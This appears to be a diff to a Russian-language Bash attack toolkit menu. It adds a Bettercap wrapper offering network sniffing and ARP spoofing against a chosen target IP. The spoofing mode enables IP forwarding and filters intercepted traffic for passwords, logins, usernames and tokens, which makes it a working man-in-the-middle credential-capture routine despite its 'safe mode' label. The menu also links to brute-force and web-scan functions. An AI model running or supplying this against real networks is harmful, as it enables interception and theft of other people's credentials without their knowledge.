@@ -85,6 +85,49 @@ except Exception as e:
     fi
 }
 
+# Функция для автоматизации Bettercap
+smart_bettercap() {
+    echo -e "${CYAN}=== УМНЫЙ BETTERCAP (БЕЗОПАСНЫЙ РЕЖИМ) ===${NC}"
+    echo -e "${BLUE}1.${NC} СНИФФИНГ (Только прослушка)"
+    echo -e "${BLUE}2.${NC} ARP-SPOOFING (Защита от падения сети)"
+    echo -e "${BLUE}3.${NC} ПОЛНЫЙ МОНИТОРИНГ"
+    read -p "Выберите режим: " bcap_opt
+
+    case $bcap_opt in
+        1) 
+            bettercap -eval "net.probe on; net.sniff on; set net.sniff.verbose true"
+            ;;
+        2) 
+            read -p "Введите IP цели (обязательно): " b_target
+            if [[ -z "$b_target" ]]; then echo "Цель не введена!"; sleep 2; return; fi
+            
+            echo -e "${GREEN}[*] Включаю IP Forwarding в системе...${NC}"
+            echo 1 > /proc/sys/net/ipv4/ip_forward
+
+            echo -e "${GREEN}[*] Запуск ARP-Spoofing на $b_target...${NC}"
+            # Команда ниже включает спуфинг только для цели, игнорируя лишние пакеты
+            bettercap -eval "
+                set net.sniff.verbose false;
+                set net.sniff.local true;
+                set arp.spoof.targets $b_target;
+                set arp.spoof.internal true;
+                arp.spoof on;
+                net.sniff on;
+                set net.sniff.regexp .*password|.*login|.*user|.*token
+            "
+            
+            echo -e "${YELLOW}[*] Выключаю IP Forwarding...${NC}"
+            echo 0 > /proc/sys/net/ipv4/ip_forward
+            ;;
+        3) bettercap ;;
+        *) return ;;
+    esac
+    
+    echo -e "${CYAN}--- Нажмите Enter для возврата ---${NC}"
+    read
+}
+
+
 # Функция для умного брутфорса
 smart_brute() {
     read -p "Введите IP цели: " target
@@ -152,7 +195,7 @@ while true; do
             ;;
         4) smart_brute ;;
         5) smart_web_scan ;;
-        6) bettercap ;;
+        6) smart_bettercap ;;
         7) 
             df -h /
             echo -e "\${CYAN}--- Нажмите Enter для возврата ---\${NC}"
